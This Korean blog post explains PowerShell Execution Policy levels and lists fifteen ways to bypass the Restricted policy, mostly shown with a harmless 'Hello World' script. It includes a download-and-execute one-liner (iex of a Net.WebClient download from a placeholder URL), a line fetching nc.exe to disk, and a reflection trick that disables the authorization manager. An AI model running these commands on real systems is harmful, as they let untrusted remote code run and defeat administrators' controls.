---
layout: post
title: Execution Policy의 Restricted을 우회하여 PowerShell 실행
description: "Execution Policy의 Restricted을 우회하여 PowerShell 실행"
modified: 2018-12-19
tags: [PowerShell]
---


## 개요
> 윈도우 파워셸(Windows PowerShell)은 마이크로소프트가 개발한 확장 가능한 명령 줄 인터페이스(CLI) 셸 및 스크립트 언어를 특징으로 하는 명령어 인터프리터이다. 스크립트 언어는 닷넷 프레임워크 2.0을 기반으로 객체 지향에 근거해 설계되었다. - wikipedia

- `ps1` 파일은 기본 보안정책으로 사용이 불가능
    + Windows Server 2012 R2만 기본 보안정책 설정이 `RemoteSigned`
    + 그 외 모든 버전(Windows 8.1 포함)은 기본 보안정책 설정이 `Restricted`
- 스크립트를 실행하려면 Execution Policy 허용 필요
    + 로컬 컴퓨터에서는 관리자 권한으로 Execution Policy 설정이 가능
    + 보안 강화를 위해 Active Directory의 Group Policy를 통하여 설정 가능  
    + Active Directory > Group Policy Management > `Turn on Script Execution` 설정
    ![](https://user-images.githubusercontent.com/16396760/50433736-61249600-091d-11e9-94f5-5d66aa02c215.png)
    + Group Policy 설정하면 관리자 권한으로도 Policy Execution 을 변경 불가
    ![](https://user-images.githubusercontent.com/16396760/50433738-61bd2c80-091d-11e9-9efd-b8d472b55b08.PNG)


-----
## 테스트 환경 설정

### Execution Policy 확인  
```
 PS > Get-ExecutionPolicy -List | ft -Autosize
```
![001](https://user-images.githubusercontent.com/16396760/50223763-752d3c80-03df-11e9-87da-b9c1de4b4c6d.png)

### 실행 정책 변경 (관리자 권한)  
```
PS > Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
PS > Set-ExecutionPolicy Bypass
PS > Set-ExecutionPolicy Restricted -Force
```
  
### Execution Policy 종류

| Policy | Local Script 실행 | Remote Script 실행 |
|:------:|:---------------:|:-----------------:| 
| Restricted| 불가능| 불가능 |
| AllSigned | 디지털 서명된 스크립트실행 가능 | 디지털 서명된 스크립트실행 가능|
| RemoteSigned | 가능 | 디지털 서명된 스크립트실행 가능|
| Unrestricted | 가능 | 가능 |
| Bypass | 가능 | 가능 |


- Remote Signed
    + 로컬 저장된 스크립트는 실행 가능
    + 원격에서 다운로드한 스크립트는 디지털 서명된 경우에만 실행 가능
        ```  
        PS > \\[원격]\Process.ps1
        PS > invoke-Expression -Command \\[원격]\Process.ps1
         ```
- UnRestricted
    + 원격에 있는 스크립트를 실행할때는 경고창을 출력후 실행
- Restricted
    + 로컬/원격 스크립트 모두 실행 불가
- Bypass
    + 로컬/원격 스크립트 실행 가능
         ```
        # 관리자 사용 
        PS > Set-ExcutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
         ```
- AllSigned
    + 스크립트에 디지털 서명이 되어있지 않으면 실행 불가
    + Group Policy로 AllSigned로 설정하면 각 컴퓨터에서는 설정 변경을 하지 못하므로 디지털 서명된 스크립트 파일만 실행 가능

----
## 정책을 우회 하여 PowerShell 실행
간단한 스크립트를 작성하여 ps1파일로 저장 후 실행
```
Write-Host "Hello World! run me!!!"
```
- `Get-ExecutionPolicy` 명령어로 실행 정책 확인
    ![003](https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png)
- `Restricted` 정책일 경우 PowerShell 스크립트 사용 불가
    ![002](https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png)



1. Paste the Script into an Interactive PowerShell Console
    ![004](https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png)

2. Echo the Script and Pipe it to PowerShell Standard In
    ```
    Echo Write-Host "Hello World! run me!!!"  | PowerShell.exe -noprofile -
    ```  
    ![006](https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png)

3. Read Script from a File and Pipe to PowerShell Standard In
    ```
    Get-Content .run.ps1 | PowerShell.exe -noprofile - 
    ```
    ![005](https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png)
    ```
    TYPE .run.ps1 | PowerShell.exe -noprofile -
    ```
    ![007](https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png)

4. Download Script from URL and Execute with Invoke Expression
    ```
    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL주소')"
    powershell -nop -c "Invoke-Expression(New-Object Net.WebClient).DownloadFile('URL주소', c:\temp\nc.exe)"
    ```

5. Use the Command Switch
    ```
    Powershell -command "Write-Host 'Hello World! run me!!!'"
    ```
    ![008](https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png)

6. Use the EncodeCommand Switch
    ```
    $command = "Write-Host 'Hello World! run me!!!'" 
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
    $encodedCommand = [Convert]::ToBase64String($bytes) 
    powershell.exe -EncodedCommand $encodedCommand
    ```
    ![010](https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png)

    ![011](https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png)

7. Use the Invoke-Command Command
    ```
    invoke-command -scriptblock {Write-Host "Hello World! run me!!!"}
    ```
    ![012](https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png)

8. Use the Invoke-Expression Command
    ![013](https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png)

    ![014](https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png)

9. Use the “Bypass” Execution Policy Flag
    ```
    PowerShell.exe -ExecutionPolicy Bypass -File .run.ps1
    ```
    ![015](https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png)

10. Use the “Unrestricted” Execution Policy Flag
    ```
    PowerShell.exe -ExecutionPolicy UnRestricted -File .run.ps1
    ```
    ![016](https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png)

11. Use the “Remote-Signed” Execution Policy Flag
    ```
    PowerShell.exe -ExecutionPolicy Remote-signed -File .run.ps1
    ```
    
12. Disable ExecutionPolicy by Swapping out the AuthorizationManager
    ```
    PS > function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
    PS > Disable-ExecutionPolicy
    PS > .\run.ps1
    ```
    ![017](https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png)

13. Set the ExcutionPolicy for the Process Scope
    ![018](https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png)

14. Set the ExcutionPolicy for the CurrentUser Scope via Command
    ```
    Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
    ```
    ![019](https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png)

15. Set the ExcutionPolicy for the CurrentUser Scope via the Registry
    ```
    HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
    ```
    ![021](https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png)
    ![020](https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png)

----
#### 참조
 [Microsoft](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-6)  
 [NETSPI](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)  
 [Winaero](https://winaero.com/blog/change-powershell-execution-policy-windows-10/)  
